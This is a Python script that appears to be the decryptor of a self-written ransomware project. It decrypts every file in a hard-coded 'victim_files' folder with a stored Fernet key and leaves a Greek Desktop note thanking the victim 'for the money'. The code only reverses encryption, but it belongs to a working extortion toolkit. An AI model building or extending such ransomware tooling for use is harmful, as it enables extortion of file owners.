from cryptography.fernet import Fernet
import os

#BASICALLY THE DECRYPTOR WORKS EXACTLY THE SAME
#ONLY DIFFRENCE BEING INSTEAD OF F.ENCRYPT WE USE F.DECRYPT METHOD

with open('cryptKey','rb')as k:
    key=k.read()

f=Fernet(key)

login=os.getlogin()

def decryptAll(fullpath):
    with open(fullpath,'rb')as original:
        ori=original.read()
    e=f.decrypt(ori)

    with open(fullpath,'wb')as decrypted_files:
        decrypted_files.write(e)

    with open('C:\\Users\\'+login+'\\Desktop\\readme2.txt','w',encoding='utf-8')as fi:
        fi.write('Τα Αρχεια Ξεκλειδωθηκαν Ευχαριστω Για τα Λεφτα')

def search_files():
    start_path='C:\\Users\\kounela\\Desktop\\projects\\python\\ransomware\\victim_files'
    for root,d,files in os.walk(start_path):
        root_directory=root
        for f in files:
            full_path=os.path.join(root_directory,f)
            print('\n**** Τα Αρχεια Ξεκλειδωνονται ****')
            decryptAll(full_path)
search_files()